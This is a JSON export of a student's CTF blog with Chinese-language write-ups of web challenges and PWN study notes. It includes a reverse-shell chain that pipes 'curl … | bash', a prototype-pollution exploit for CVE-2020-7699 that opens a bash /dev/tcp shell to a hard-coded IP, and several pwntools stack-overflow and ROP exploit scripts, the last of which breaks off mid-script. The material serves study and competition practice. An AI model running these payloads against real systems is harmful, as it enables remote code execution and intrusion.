{"meta":{"title":"Pz1o","subtitle":"Pz1o","description":"CTFer,CUMT","author":"Pz1o","url":"https://pz1o.top","root":"/"},"pages":[{"title":"categories","date":"2020-11-20T16:07:59.159Z","updated":"2020-11-20T16:07:59.159Z","comments":true,"path":"categories/index.html","permalink":"https://pz1o.top/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-11-20T16:08:29.622Z","updated":"2020-11-20T16:08:29.622Z","comments":true,"path":"tags/index.html","permalink":"https://pz1o.top/tags/index.html","excerpt":"","text":""},{"title":"About","date":"2020-11-20T12:52:38.000Z","updated":"2020-11-20T16:10:51.939Z","comments":true,"path":"about/index.html","permalink":"https://pz1o.top/about/index.html","excerpt":"","text":"CUMT大二在读 业余混子… 正在学习PWN"}],"posts":[{"title":"复现wp","slug":"复现wp","date":"2099-09-28T02:18:17.000Z","updated":"2020-11-20T14:19:52.357Z","comments":true,"path":"2099/09/28/复现wp/","link":"","permalink":"https://pz1o.top/2099/09/28/%E5%A4%8D%E7%8E%B0wp/","excerpt":"","text":"Hitcon2017 babyfirst-revenggithub复现地址 https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge 考点命令执行构造反弹shell 源码如下： 12345678910&lt;?php $sandbox = '/www/sandbox/' . md5(\"orange\" . $_SERVER['REMOTE_ADDR']); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 5) &#123; @exec($_GET['cmd']); &#125; else if (isset($_GET['reset'])) &#123; @exec('/bin/rm -rf ' . $sandbox); &#125; highlight_file(__FILE__); 先说几个知识点： 1234&gt;e\\&gt;cho\\&#39;123&#39;&gt;123 在linux中换行可以执行间断的命令 1234567&gt;root@kali:~# vi 1 //在1下写入cat flag.txt&gt;root@kali:~# touch flag.txt&gt;root@kali:~# echo \"cumtctf&#123;i_am_so_cute&#125;\" &gt;&gt; flag.txt&gt;root@kali:~# cat flag.txt&gt;cumtctf&#123;i_am_so_cute&#125;&gt;root@kali:~# sh 1&gt;cumtctf&#123;i_am_so_cute&#125; 在Linux下面可以通过写入一个文件，文件里面的内容是系统命令，然后可以通过sh filename来执行文本里面的系统命令，如果有报错的话会自动跳过 CUMTCTF2020Web简单的文件包含？考点require_once绕过 源码如下 1234567891011&lt;?phpif ($_SERVER['HTTP_CLIENT_IP'] != '127.0.0.1' &amp;&amp; $_SERVER['HTTP_X_REAL_IP'] != '127.0.0.1')&#123; if ($_SERVER['HTTP_X_FORWARDED_FOR'] == \"127.0.0.1\") &#123; die(\"Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naive\"); &#125; die(\"Sorry, this site is only optimized for those who comes from localhost\"); &#125;show_source(__FILE__);include_once(\"flag.php\");if(isset($_POST['f'])) include_once($_POST['f']); 这里主要问题是reuqire_once的问题 https://www.anquanke.com/post/id/213235#h3-2 这里面的源码解析有得还是看不懂，日后再翻 首先说一下php文件包含的机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经require_once(&#39;flag.php&#39;)，已经include的文件不可以再require_once。 payload 1php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php /proc/self指向当前进程的/proc/pid/ /proc/self/root/指向/的符号 👍🙌😃考点代码格式化、反混淆，bcrypt爆破，命令执行 这个题 我只能说真的牛逼 真的开眼界 还可以这样 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;?phprequire 'vendor/autoload.php';use Bcrypt\\Bcrypt;highlight_file(__FILE__);ini_set(\"display_errors\",\"Off\");$🙐=array('🙐','🙑','🙒','🙓','🙔','🙕','🙖','🙗','🙘','🙙','🙚','🙛','🙜','🙝','🙞','🙟');$🙠=array('🙠','🙡','🙢','🙣','🙤','🙥','🙦','🙧','🙨','🙩','🙪','🙫','🙬','🙭','🙮','🙯');$🙰=array('🙰','🙱','🙲','🙳','🙴','🙵','🙶','🙷','🙸','🙹','🙺','🙻','🙼','🙽','🙾','🙿');$😀=array('😀','😁','😂','😃','😄','😅','😆','😇','😈','😉','😊','😋','😌','😍','😎','😏');$😐=array('😐','😑','😒','😓','😔','😕','😖','😗','😘','😙','😚','😛','😜','😝','😞','😟');$😠=array('😠','😡','😢','😣','😤','😥','😦','😧','😨','😩','😪','😫','😬','😭','😮','😯');$😰=array('😰','😱','😲','😳','😴','😵','😶','😷','😸','😹','😺','😻','😼','😽','😾','😿');$🙀=array('🙀','🙁','🙂','🙃','🙄','🙅','🙆','🙇','🙈','🙉','🙊','🙋','🙌','🙍','🙎','🙏');$🏁 = array($🙠,$🙠,$🙰,$😀,$😐,$😠,$😰,$🙀);$😳😃😢🙉😲😗😦🙅 = \"strlen\";$😩😂😸🙉 = \"chr\";$🎁 = \"base64_decode\";$😱😨😞🙊😪😨😡😍 = \"isset\";function 😪😗😦😺😲😂😢😼($😳😃😢🙉) &#123; global $🏁,$😳😃😢🙉😲😗😦🙅,$😩😂😸🙉,$🎁,$😱😨😞🙊😪😨😡😍; $😲😗😦🙅= (\"$😳😃😢🙉😲😗😦🙅\")($😳😃😢🙉)/4; $😳😂😚😼 = \"\"; for ($😱😧😼🙀 = 0;$😱😧😼🙀&lt;$😲😗😦🙅;$😱😧😼🙀++) &#123; $😩😂😦🙃 =$😳😃😢🙉[$😱😧😼🙀*4].$😳😃😢🙉[$😱😧😼🙀*4+1].$😳😃😢🙉[$😱😧😼🙀*4+2].$😳😃😢🙉[$😱😧😼🙀*4+3]; $😪😾😞😀 =0; $😳😂😦😺 =0; for ($😱😽🙀🙁 =0;$😱😽🙀🙁&lt;8;$😱😽🙀🙁++) &#123; for ($😱😂🙄🙂=0;$😱😂🙄🙂&lt;16;$😱😂🙄🙂++) &#123; if($😩😂😦🙃 == $🏁[$😱😽🙀🙁][$😱😂🙄🙂]) &#123; $😪😾😞😀=$😱😽🙀🙁; $😳😂😦😺 = $😱😂🙄🙂; &#125; &#125; &#125; $😲😾😦🙄 = $😪😾😞😀*16+$😳😂😦😺; $😳😂😚😼 = $😳😂😚😼.(\"$😩😂😸🙉\")($😲😾😦🙄); &#125; return (\"$🎁\")($😳😂😚😼);&#125;function 😁😁() &#123; global $🏁,$😳😃😢🙉😲😗😦🙅,$😩😂😸🙉,$🎁,$😱😨😞🙊😪😨😡😍; $😳😂😖🙅😪😗😚 = 😪😗😦😺😲😂😢😼(😜😃😪😸😳😹😉😃😴😃😳🙆😱😘😢🙄😲😓😉🙊😩😧😅😻😩😽😉😄😜🙇😍😍).😪😗😦😺😲😂😢😼(😲😧😡😁)($_SERVER[😪😗😦😺😲😂😢😼(😥😻😦😞😤😁😢😖😨😀😖😕😢😖😙😍)]); 😪😗😦😺😲😂😢😼(😲😧🙄😻😱😨😙😍)($😳😂😖🙅😪😗😚); 😪😗😦😺😲😂😢😼(😩😂😸😻😱😨😙😍)($😳😂😖🙅😪😗😚); if (isset($_GET[😪😗😦😺😲😂😢😼(😩😂😁😻)]) &amp;&amp; ($😳😃😢🙉😲😗😦🙅)($_GET[😪😗😦😺😲😂😢😼(😩😂😁😻)]) &lt;= 5) &#123; @😪😗😦😺😲😂😢😼(😪😨😸😼😩🙇😍😍)($_GET[😪😗😦😺😲😂😢😼(😩😂😁😻)]); &#125; else if (isset($_GET[😪😗😦😺😲😂😢😼(😳😽😦🙊😪😨😡😍)])) &#123; @😪😗😦😺😲😂😢😼(😪😨😸😼😩🙇😍😍)(😪😗😦😺😲😂😢😼(😳😽😀😷😜😨😚😽😙😑😍😍) . $😳😂😖🙅😪😗😚); &#125;&#125;$🎯 = new Bcrypt();$🔑 = $_POST[😪😗😦😺😲😂😢😼(😳😗😖🙊😳😃😴😻)];$🔒 = 😪😗😦😺😲😂😢😼(😚😔😚😅😚😔😕🙇😚😖😚😓😪😽😻😄😥😨😒😛😣😼😖😢😲😥🙀😕😞😻😪😅😲😘😦🙉😣😽😦🙈😲😦😑🙅😞😽😞😞😲😺😴😀😪😗😉😜😩😃🙀😝😝😾😩😅😱😖😞😺😪😔😼😆😢😗😿🙊😴😁😸😼);if($🎯-&gt;verify($🔑, $🔒)) &#123; echo(😪😗😦😺😲😂😢😼(😠😓😉😹😳😺😅😡😩😨😞🙊😴😂😉🙉😪😓😒😂😪😨😚🙀😪😽😼😼😪😓😕😈😜😂😚🙉😠😷😍😍)); echo(😪😗😦😺😲😂😢😼(😦😂😉😃😙😣😖😟😲😃😳🙃😱😗😖😺😱🙉😒🙀😴😓😕😈😜😂😚🙉😠😷😍😍)); 😁😁();&#125; else &#123; echo(😪😗😦😺😲😂😢😼(😠😓😉😹😳😺😅😡😩😨😞🙊😴😂😉🙉😪😓😒🙅😲😃😡😷😲😧😖😀😩😂😷😸😠😓😉😹😳😺😄😍));&#125; 首先是代码格式化，接着就是理解代码的执行逻辑，顺便改变代码逻辑 看题解上看的是第一个函数，也就是混淆 为什么要先看第一个函数 所以我们就想直接看在不同参数下第一个函数执行输出的结果，所以在第一个函数中添加 1234567891011121314151617181920212223function 😪😗😦😺😲😂😢😼($😳😃😢🙉) &#123; echo \"加密后：\".$😳😃😢🙉; global $🏁,$😳😃😢🙉😲😗😦🙅,$😩😂😸🙉,$🎁,$😱😨😞🙊😪😨😡😍; $😲😗😦🙅= (\"$😳😃😢🙉😲😗😦🙅\")($😳😃😢🙉)/4; $😳😂😚😼 = \"\"; for ($😱😧😼🙀 = 0;$😱😧😼🙀&lt;$😲😗😦🙅;$😱😧😼🙀++) &#123; $😩😂😦🙃 =$😳😃😢🙉[$😱😧😼🙀*4].$😳😃😢🙉[$😱😧😼🙀*4+1].$😳😃😢🙉[$😱😧😼🙀*4+2].$😳😃😢🙉[$😱😧😼🙀*4+3]; $😪😾😞😀 =0; $😳😂😦😺 =0; for ($😱😽🙀🙁 =0;$😱😽🙀🙁&lt;8;$😱😽🙀🙁++) &#123; for ($😱😂🙄🙂=0;$😱😂🙄🙂&lt;16;$😱😂🙄🙂++) &#123; if($😩😂😦🙃 == $🏁[$😱😽🙀🙁][$😱😂🙄🙂]) &#123; $😪😾😞😀=$😱😽🙀🙁; $😳😂😦😺 = $😱😂🙄🙂; &#125; &#125; &#125; $😲😾😦🙄 = $😪😾😞😀*16+$😳😂😦😺; $😳😂😚😼 = $😳😂😚😼.(\"$😩😂😸🙉\")($😲😾😦🙄); &#125; echo \"原文：\".(\"$🎁\")($😳😂😚😼); return (\"$🎁\")($😳😂😚😼);&#125; 之后依次修改代码逻辑，替换其中第一个函数输出结果 核心代码 1234567891011121314151617181920212223function 😁😁() &#123; global $🏁,$strlen,$chr,$base64_decode,$isset; $path = \"/var/www/html/sandbox/\".md5($_SERVER['REMOTE_ADDR']); mkdir($path); chdir($path); if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 5) &#123; @exec($_GET['cmd']); // &#125; else if (isset($_GET['reset'])) &#123; @exec(\"rm -rf\" . $path); &#125;&#125;$🎯 = new Bcrypt();$🔑 = $_POST[\"passwd\"];$🔒 = \"$2y$10$RBfi8QpJJQQmJD6FylurJeqmP.6cMn7tdoKczL2v9hScd9zDj3wXe\";if($🎯-&gt;verify($passwd, $lock)) &#123; echo \"Password verified!\"; echo \"Wow!!Now,hack it!\"; 😁😁();&#125; else &#123; echo \"&lt;/br&gt;Password not match!&lt;/br&gt;\";&#125; 然后发现有composer包，安装，然后查资料bcrypt bcryptbcrypt是一种哈希算法，可以通过硬件进行扩展（通过可配置的循环次数）。 bcrypt是一种单向哈希算法。如果不知道盐，圆和密码（密码），则无法检索纯文本密码。 加盐： 就是人为的通过一组随机字符与用户原密码的组合形成一个新的字符，从而增加破译的难度。 在php中，主要有内置的函数password_hash和password_verify 12345678910111213141516171819$a = password_hash('password',PASSWORD_DEFAULT);echo $a.\"&lt;br&gt;\";if(password_verify('password',$a))&#123; echo \"success\";&#125;else&#123; echo \"failed\";&#125;var_dump(password_get_info($a));#输出信息array (size=3) 'algo' =&gt; int 1 'algoName' =&gt; string 'bcrypt' (length=6) 'options' =&gt; array (size=1) 'cost' =&gt; int 10$a = password_hash('password',PASSWORD_DEFAULT,array('cost' =&gt; 11));//相应的cost也会变为11； 接下来就是爆破，已知密码为bcrypt+4位小写字母 1234567891011121314151617181920&lt;?php require 'vendor/autoload.php'; use Bcrypt\\Bcrypt; $key = \"abcdefghijklmnopqrstuvwxyz\"; $bcrypt = new Bcrypt(); $plaintext = 'bcrypt';//bcryptyyds $ciphertext = '$2y$10$RBfi8QpJJQQmJD6FylurJeqmP.6cMn7tdoKczL2v9hScd9zDj3wXe'; for($i=0;$i&lt;26;$i++) &#123; for($j=0;$j&lt;26;$j++) &#123; for($k=0;$k&lt;26;$k++) &#123; for($m=0;$m&lt;26;$m++) &#123; echo $plaintext.$str.PHP_EOL; $str = $key[$i].$key[$j].$key[$k].$key[$m]; if($bcrypt-&gt;verify($plaintext.$str, $ciphertext))&#123; echo(\"&lt;/br&gt;Password verified!&lt;/br&gt;\"); echo(\"Wow!!Now,hack it!&lt;/br&gt;\"); &#125; &#125; &#125; &#125; &#125; 命令执行最终的考点就是命令执行可以参考hitcon-ctf-2017 123456789101112function 😁😁() &#123; global $🏁,$strlen,$chr,$base64_decode,$isset; $path = \"/var/www/html/sandbox/\".md5($_SERVER['REMOTE_ADDR']); mkdir($path); chdir($path); if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 5) &#123; @exec($_GET['cmd']); // &#125; else if (isset($_GET['reset'])) &#123; @exec(\"rm -rf\" . $path); &#125;&#125; 这道题大概意思就是存在命令执行，但单次输入字符不得大于5。因此利用linux下特有的命令来写入shell反弹。原理就是利用curl ip|bash等很多方式去反弹shell。顺便也复习了反弹shell的一些基本操作 官方的脚本 12345678910111213141516171819202122232425262728293031323334353637383940import requestsimport urllibfrom time import sleepurl = \"http://219.219.61.234:10048/?cmd=\"payload = [ # generate \"g&gt; ht- sl\" to file \"v\" '&gt;dir', '&gt;sl', '&gt;g\\&gt;', '&gt;ht-', '*&gt;v', # reverse file \"v\" to file \"x\", content \"ls -th &gt;g\" ' '&gt;rev', '*v&gt;x', # generate \"curl 0X2761697D|bash\" '&gt;sh ', '&gt;ba\\\\', '&gt;\\|\\\\', '&gt;\\\\', '&gt;7D\\\\', '&gt;69\\\\', '&gt;61\\\\', '&gt;27\\\\', '&gt;0X\\\\', '&gt;\\ \\\\', '&gt;rl\\\\', '&gt;cu\\\\', # got shell 'sh x', 'sh g',]for i in payload: assert len(i) &lt;= 5 data = &#123; 'passwd':'bcryptyyds', &#125; header = &#123; \"Content-Type\" : \"application/x-www-form-urlencoded\", \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,ima ge/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", \"Upgrade-Insecure-Requests\" : \"1\" &#125; r = requests.post(url + urllib.quote(i),data=data,headers=header) print(i) sleep(0.1) 这个很郁闷，配置环境很长时间还是没能弄出来 EZnode应该是国赛分区赛的题 考点nginx反向代理配置错误 首先来学习一下ngnix ngnixngnix是一款自由的、开源的、高性能的HTTP服务器和反向代理服务器。 主要在三个方面 反向代理 负载均衡 nginx特点 反向代理 先说正向代理 客户端非常明确要访问的服务器地址；服务器只清楚请求来自哪个代理服务器，而不清楚来自哪个具体的客户端；正向代理模式屏蔽或者隐藏了真实客户端信息。 上面这个图就很形象了 多个客户端给服务器发送的请求，nginx服务器接收到之后， 按照一定的规则分发给了后端的业务处理服务器进行处理了。 此时~请求的来源也就是客户端是明确的，但是请求具体由哪台服务器处理的并不明确了，nginx扮演的就是一个反向代理角色 负载均衡 在反向代理中 客户端会向服务端发出请求，而服务器将接受到的请求按照规则分发的过程，就叫做负载均衡 ngnix配置 123456789101112131415161718192021222324252627282930313233343536main # 全局配置 events &#123; # nginx工作模式配置 &#125; http &#123; # http设置 .... server &#123; # 服务器主机配置 .... location &#123; # 路由配置 .... &#125; location path &#123; .... &#125; location otherpath &#123; .... &#125; &#125; server &#123; .... location &#123; .... &#125; &#125; upstream name &#123; # 负载均衡配置 .... &#125;&#125; 发现有目录穿越漏洞参考 https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html /static../ 之后就是找cve了，比较菜，只能学习 cve-2020-7699 12345678910import requestscmd = 'bash -c \"bash -i &amp;&gt; /dev/tcp/39.97.105.125/8080 0&gt;&amp;1\"'# polluter1 = requests.post('http://219.219.61.234:20006/y0u_CaNn07_Gu3ss_tHe_pATh', files = &#123;'__proto__.outputFunctionName': ( None, \"x;process.mainModule.require('child_process').exec('&#123;&#125;');x\".format(cmd))&#125;)print(r1.text)# execute commandr2 = requests.get('http://219.219.61.234:20006/')print(r2.text) 之后反弹shell，执行命令。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"https://pz1o.top/tags/wp/"}]},{"title":"0day安全读书笔记","slug":"0day安全读书笔记","date":"2020-10-27T14:29:36.000Z","updated":"2020-11-20T14:17:51.878Z","comments":true,"path":"2020/10/27/0day安全读书笔记/","link":"","permalink":"https://pz1o.top/2020/10/27/0day%E5%AE%89%E5%85%A8%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/","excerpt":"","text":"前言三个月一起读完0day安全，赶紧拿来读一读，随缘更新 正文","categories":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/categories/PWN/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/tags/PWN/"}]},{"title":"逆向工程核心原理读书笔记","slug":"逆向工程核心原理读书笔记","date":"2020-10-27T08:09:08.000Z","updated":"2020-11-20T14:20:02.585Z","comments":true,"path":"2020/10/27/逆向工程核心原理读书笔记/","link":"","permalink":"https://pz1o.top/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/","excerpt":"","text":"前言预估三个月，但说不定为了赶其他的ddl，也就读不完了，尽力去吧 正文","categories":[{"name":"逆向","slug":"逆向","permalink":"https://pz1o.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://pz1o.top/tags/%E9%80%86%E5%90%91/"},{"name":"读书笔记","slug":"读书笔记","permalink":"https://pz1o.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}]},{"title":"PWN学习","slug":"PWN学习","date":"2020-10-24T14:32:31.000Z","updated":"2020-11-21T10:33:29.967Z","comments":true,"path":"2020/10/24/PWN学习/","link":"","permalink":"https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"PWN纯零基础，大佬请略过 从零开始学习PWN,Web会去学，但可能现在大部分时间会用在PWN上，如果需要题的话可以评论 大学中是研究深度还是广度，我可能还是需要选择一下 基本全是ppt截图 基础 1234gcc -S a.c #生成汇编文件file a.s #查看文件类型 可以看见是ascii文本gcc a.s #生成可执行文件file a.out #可以看见是可执行文件 ELF文件 虚拟内存 程序编译与链接 程序装载与进程执行 汇编指令 栈溢出基础基本原理 实例 攻击 ret2text返回地址为后门地址 ret2shellcode返回地址为写入的shellcode的地址 栈中写入shellcode bss段写入shellcode ret2libc 返回导向编程基础 攻击 调用构造 x64存放参数放入寄存器中 但超过6个就会放入栈中 动态链接过程 保护措施RELRORelocation Read-Only 它分为两种，Partial RELRO 和 Full RELRO，即 部分RELRO 和 完全RELRO。 部分RELRO 是 GCC 的默认设置，几乎所有的二进制文件都至少使用 部分RELRO。但是从攻击者角度来看呢，部分RELRO 不堪一击，因为它仅仅使 GOT 存储在 bss 段之前，这样仅仅只能防止全局变量上的缓冲区溢出从而覆盖 GOT。完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。 1234gcc -o a a.c // 默认情况下，是Partial RELROgcc -z norelro -o a a.c // 关闭，即No RELROgcc -z lazy -o a a.c // 部分开启，即Partial RELROgcc -z now -o a a.c // 全部开启，即Full RELRO The NX bits主要是保护栈区不可执行，通常在checksec中可以查看 ASLR地址随机化，也很好理解，就是不想让你找到真正的内存地址 改变值的命令 1sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space ASLR 并不负责代码段和数据段的随机化，这由 PIE 负责，但是只有在开启 ASLR 之后，PIE 才会生效。 Canary这种栈保护措施在栈帧中任何局部缓冲区与栈状态之间存储一个特殊的金丝雀值， 也称哨兵值，通俗理解，我们可以把它看成一个cookie 它是程序每次运行时随机产生的。 在恢复寄存器状态之前和从函数返回之前，程序检查这个金丝雀值是否被该函数的某个操作或者该函数调用的某个函数的某个操作改变了，如果发现异常程序会中止。最近的 GCC 版本可能会试图自动插入这种溢出检测值。 1234gcc -o a a.c // GCC 可能会试图自动插入这种溢出检测值gcc -fno-stack-protector -o a a.c //禁用栈保护gcc -fstack-protector -o a a.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码gcc -fstack-protector-all -o a a.c //启用堆栈保护，为所有函数插入保护代码 PIE位置无关代码，负责代码段和数据段bss 12345gcc -o test test.c // 默认情况下，不开启PIEgcc -fpie -pie -o test test.c // 开启PIE，此时强度为1gcc -fPIE -pie -o test test.c // 开启PIE，此时为最高强度2gcc -fpic -o test test.c // 开启PIC，此时强度为1，不会开启PIEgcc -fPIC -o test test.c // 开启PIC，此时为最高强度2，不会开启PIE 栈迁移控制ESP 格式化字符串漏洞前提：有printf 且第一个参数可控 泄露栈内存 泄露任意地址内存 篡改栈内存 篡改任意地址内存 12345678910111213%x%p 打印栈上内容%s 打印栈上解析地址的内容%n 写内容(打印字节的个数)printf(&quot;%d%d%d&quot;,a,b,c)printf(&quot;%3$d&quot;,a,b,c) 控制第三个参数printf(&quot;%20c&quot;,c)printf(&quot;aaa%n&quot;,c)printf(&quot;%7$n&quot;)%n 0x00000004%hn 0x0004 堆什么是堆 堆管理器 逻辑链表：指针连起来,把同类的chunk连起来 物理链表：通过size域组织相邻chunk之间的关系，判断相邻是否为free chunk，若是，则合并 arena chunk malloced chunkchunk pre size:记录上一个free chunk的大小，若上一个chunk在用，则pre size将被合并 size:整个chunk 的大小 top chunk 从操作系统批发的不分给用户的chunk free chunksmall bin chunk large bin chunk fast bin chunk pre size 复用 bin分配方式：fastbin —&gt;unsorted bin—&gt;small bin/large bin tcachefastbins bin的双向链表 unsorted bin small bins large bins 实例 堆漏洞 工具学习pwntools1234567891011121314151617181920212223242526272829303132333435363738394041#Import pwntoolsfrom pwn import *#Local communicationio = process(\"./a.out\")#Telecommunicationio = remote(\"ip\",port)#Receive messageio.recvline()io.recvuntil(b\":\")io.recvuntil(b\" : \",drop = True)io.recv()#Send messageio.sendline(b\"abc\")io.send(p32(0)+b\"\\x0a\")io.sendlineafter(b\" :\",str)#Interactiveio.interactive()#shellcodeshellcraft.sh() #in sh environmentshellcraft.amd64.sh() #64 bitasm(shellcraft.sh()) #machine codeasm(shellcraft.sh()).ljust(112,b'a') #if the length is less than 112,then it will be supplemented whith a. #if you want to attack the 64 bit,pls add itcontext.arch = \"amd64\"#find stringself = ELF(\"./filename\")hex(next(elf.search(b\"/bin/sh\")))#elf fileelf = ELF(\"./file\")hex(elf.got[\"puts\"])hex(elf.plt[\"system\"])hex(elf.symbols[\"buf2\"])#flatflat([1,2])#generate datacyclic(60)#byte datap32(1234)\\xd2\\x04\\x00\\x00u32(\"\\xd2\\x04\\x00\\x00\")1234 gdb123456789101112131415161718192021222324252627282930313233343536373839404142434445#startgdb filestart#run the executablerun#backtracebacktrace#returnreturn#breakpointb mainb functionb *0x#information for breakpointinfo b#delete the breakpointd num#runr #next step overn #step in s #stackstack sizestack 24#virtual memory map#to look rwx segmentvmmap#plt pltx px/20 p#gotgot#chunkfastbinheap#libcb *$rebase(0x18540)pause()attach pidreturn IDA1234G 直接跳转地址shift+f12 打开字符串窗口shift+E 提取字符串n 重命名变量 ROPgadget1ROPgadget --binary filename --only &quot;pop|ret&quot; one_gadget1libcbase + one_gadget_address 练习题非常简单，适合入门 栈溢出ret2text直接有后门函数，所以我们只需要把垃圾数据填满覆盖ebp，然后让返回地址返回后门函数的地址就行 1234567from pwn import *io = process(\"./ret2text\")payload = b'a'*20 + p32(0x8048522)io.sendline(payload)io.interactive() ret2shellcode自己写入shellcode(bss)，然后溢出地址 12345678910from pwn import * io = process(\"./ret2shellcode\")buf2 = 0x804a080shellcode = asm(shellcraft.sh()).ljust(112,b'a')payload = shellcode + p32(buf2)io.sendline(payload)io.interactive() ret2syscallROPgadget 12345678910111213from pwn import *io = process(\"./ret2syscall\")pop_eax = 0x80bb196pop_edx = 0x806eb90int_80 = 0x08049421payload =flat([ b'A'* 112 , pop_eax , 0xb ,pop_edx, 0, 0, 0x80be408 ,int_80])print(io.recv())io.sendline(payload)io.interactive() ret2libc1 栈溢出，有/bin/sh字符串 system@plt 构造 12345678from pwn import *elf = ELF(\"./ret2libc1\")io = process(\"./ret2libc1\")system_plt = elf.plt[\"system\"]bin_sh = next(elf.search(b\"/bin/sh\"))payload = b'A'*0x70 + p32(system_plt) + b'BBBB' + p32(bin_sh)io.sendline(payload)io.interactive() ret2libc2栈溢出 无/bin/sh字符串，但bss段可写 第一种 123456789101112from pwn import *io = process(\"./ret2libc2\")elf = ELF(\"./ret2libc2\")system_plt = elf.plt[\"system\"]gets_plt = elf.plt[\"gets\"]bss = 0x804a080payload = b'A'*0x70 + p32(gets_plt) + p32(system_plt) + p32(bss) + p32(bss)io.sendline(payload)io.sendline(b\"/bin/sh\\x00\")io.interactive() 第二种 12345678910111213from pwn import *io = process(\"./ret2libc2\")elf = ELF(\"./ret2libc2\")system_plt = elf.plt[\"system\"]gets_plt = elf.plt[\"gets\"]bss = 0x804a080pop_ebx_ret = 0x804843dpayload = b'A'*0x70 + p32(gets_plt) + p32(pop_ebx_ret) + p32(bss) + p32(system_plt) + p32(pop_ebx_ret) + p32(bss)io.sendline(payload)io.sendline(b\"/bin/bash\\x00\")io.interactive() retlibc3栈变量的结构 栈的结构 泄露libc 应该是libc不同导致打不通 12345678910111213141516from pwn import *io = process(\"./ret2libc3\")elf = ELF(\"./ret2libc3\")libc = ELF(\"libc-2.23.so\")put = elf.got[\"puts\"]puts = libc.symbols[\"puts\"]system = libc.symbols[\"system\"]io.sendlineafter(b\" :\",str(put))io.recvuntil(b\" : \")libcbase = int(io.recvuntil(b\"\\n\",drop = True),16) - putspayload = flat( cyclic(60), libcbase + system , 0xdeadbeef ,next(elf.search(b\"sh\\x00\")))io.sendlineafter(b\" :\",payload)io.interactive() pwn2_x64栈图 pwn3 通过libc泄露系统函数，首先获得基地址可以通过以下来泄露（1）通过ROP系统调用（2）直接函数write泄露 无sh （1）符号有无sh （2）通过ROP将/bin/sh写入 （3）libc中/bin/sh 12345678910111213141516171819202122232425from pwn import *io = process(\"./level3\")libc = ELF(\"/lib/i386-linux-gnu/libc.so.6\")elf = ELF(\"./level3\")vulfun_addr = 0x0804844B write_plt = elf.symbols[\"write\"]write_got = elf.got[\"write\"]payload1 = cyclic(0x88+4) + p32(write_plt) + p32(vulfun_addr) + p32(1) + p32(write_got) + p32(4)io.recvuntil(b\"Input:\\n\")io.sendline(payload1)write_addr = u32(io.recv(4)) #Specify four byteslibc_base = write_addr - libc.symbols[\"write\"]system_addr = libc.symbols[\"system\"] + libc_basesh_addr = libc_base + next(libc.search(b\"/bin/sh\"))#libc_write=libc.symbols['write']#libc_system=libc.symbols['system']#libc_sh=next(libc.search(b'/bin/sh'))#system_addr=write_addr-libc_write+libc_system #sh_addr=write_addr-libc_write+libc_shpayload2 = cyclic(0x88+4) + p32(system_addr) + b'A'*4 + p32(sh_addr)io.sendline(payload2)io.interactive() pwn3_x64两次ROP 1234567891011121314151617181920212223from pwn import * #context.log_level=\"debug\" elf=ELF(\"level3_x64\") write_plt=elf.symbols[\"write\"] write_got=elf.got[\"write\"] vul_addr=elf.symbols['vulnerable_function']p = process(\"./level3_x64\")#p=remote(\"47.116.107.8\",9883) p.recvuntil(b\"Input:\\n\") pop_rdi_addr=0x00000000004006b3 #0x00000000004006b3 : pop rdi ; retpop_rsi_r15_addr=0x00000000004006b1 #0x00000000004006b1 : pop rsi ; pop r15 ; retpayload1 = cyclic(0x80+8) + p64(pop_rdi_addr) + p64(1) + p64(pop_rsi_r15_addr) + p64(write_got) + p64('deadbeef') + p64(write_plt) + p64(vul_addr) p.sendline(payload1) t=p.recv(8)write_addr=u64(t[0:8]) 